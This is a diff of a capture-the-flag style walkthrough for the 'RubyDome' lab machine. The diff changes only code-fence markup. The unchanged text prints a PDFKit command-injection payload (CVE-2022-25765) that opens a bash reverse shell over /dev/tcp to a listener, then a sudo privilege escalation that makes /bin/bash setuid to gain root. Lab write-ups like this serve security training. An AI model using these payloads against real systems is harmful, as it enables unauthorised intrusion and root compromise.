@@ -14,11 +14,11 @@ port 3000 is running a webpage of RubyDome HTML to PDF
 search and found CVE-2022-25765  
 there is a cmd injection in the input box  
 https://github.com/lekosbelas/PDFkit-CMD-Injection
-```
+```console
 http://"TARGET_ADDRESS:Target PORT"//?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/"Target_ADRESS/LISTENING_PORT"<&1'`'}
 ```
 we put our ip address and got the revershell
-```
+```console
 http://192.168.45.210:22//?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/"192.168.45.210/22"<&1'`'}
 
 
@@ -32,7 +32,7 @@ uid=1001(andrew) gid=1001(andrew) groups=1001(andrew),27(sudo)
 ## Privilege Escalation
   
 user andrew can run ruby for the script app.rb as root
-```
+```console
 andrew@rubydome:~$ sudo -l
 Matching Defaults entries for andrew on rubydome:
     env_reset, mail_badpass,
@@ -43,7 +43,7 @@ User andrew may run the following commands on rubydome:
     (ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb
 ```
 we have write permission of the script app.rb
-```
+```console
 andrew@rubydome:~/app$ ls -la
 total 20
 drwxr-xr-x 2 andrew andrew 4096 Apr 25  2023 .
@@ -52,16 +52,16 @@ drwxr-x--- 3 andrew andrew 4096 Jun 13  2023 ..
 -rw-rw-r-- 1 andrew andrew 8171 Jun  8  2023 page.pdf
 ```
 edit the script 
-```
+```console
 andrew@rubydome:~/app$ echo 'system("chmod +s /bin/bash")' > /home/andrew/app/app.rb
 ```
 run the sudo to with no password
-```
+```console
 andrew@rubydome:~/app$ sudo /usr/bin/ruby /home/andrew/app/app.rb
 ```
 can the root terminal
 
-```
+```console
 andrew@rubydome:~/app$ bash -p
 
 id
